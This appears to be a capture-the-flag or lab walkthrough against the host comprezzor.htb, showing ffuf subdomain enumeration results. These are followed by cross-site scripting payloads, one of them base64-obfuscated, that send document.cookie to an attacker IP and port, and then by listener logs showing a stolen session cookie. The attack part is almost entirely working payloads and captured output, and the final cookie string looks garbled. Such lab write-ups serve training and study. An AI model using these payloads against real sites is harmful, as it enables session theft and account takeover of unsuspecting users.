
# FFUF Scan Results

Scan details:
- **URL**: http://comprezzor.htb/
- **Wordlist**: /home/aexon/tools/wordlist/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt
- **Header**: Host: FUZZ.comprezzor.htb
- **Follow redirects**: false
- **Timeout**: 10
- **Threads**: 40
- **Matcher**: Response status: 200-299,301,302,307,401,403,405,500
- **Filter**: Response size: 178

## Output

| Subdomain   | Status | Size | Words | Lines | Duration |
|-------------|--------|------|-------|-------|----------|
| auth        | 302    | 199  | 18    | 6     | 565ms    |
| report      | 200    | 3166 | 1102  | 109   | 614ms    |
| dashboard   | 302    | 251  | 18    | 6     | 598ms    |

## Summary

- **auth.comprezzor.htb**
  - **Status**: 302
  - **Size**: 199
  - **Words**: 18
  - **Lines**: 6
  - **Duration**: 565ms

- **report.comprezzor.htb**
  - **Status**: 200
  - **Size**: 3166
  - **Words**: 1102
  - **Lines**: 109
  - **Duration**: 614ms

- **dashboard.comprezzor.htb**
  - **Status**: 302
  - **Size**: 251
  - **Words**: 18
  - **Lines**: 6
  - **Duration**: 598ms



```
<img src=x onerror='eval(atob("ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNi4zOTo0NDQ1Lz9jb29raWU9Jytkb2N1bWVudC5jb29raWUp"));' />
```

```
<img src=x onerror="fetch('http://10.10.16.39:4445/?cookie='+document.cookie)" ; />
```

fetch('http://10.10.16.39:4445/?cookie='+document.cookie)

```bash
┌─[aexon@parrot]─[~]
└──╼ $nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.16.39] from (UNKNOWN) [10.10.11.15] 35138
GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1
Host: 10.10.16.39:4445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dashboard.comprezzor.htb/
Origin: http://dashboard.comprezzor.htb
Connection: keep-alive
```


```bash
┌─[aexon@parrot]─[~]
└──╼ $python3 -m http.server 4445
Serving HTTP on 0.0.0.0 port 4445 (http://0.0.0.0:4445/) ...
10.10.11.15 - - [10/Aug/2024 22:09:46] "GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 200 -
10.10.11.15 - - [10/Aug/2024 22:09:46] "GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 200 -
```

```
cookie=user_data=eyJ1c2VyX2lkIjogMTASICJ1c2VybmFtZSI6ICJOYWlwYW4iLCAic m9sZSI6ICJ1c2VyIn180TFmMDVhMTYxNGQyNzZjZDdmNTVlZGFhYjQ4NThmMjEzZjhhM2ExMDVmNTY0NGE4NTU4ZTcyMDQ5NjYwMDlhNw=
```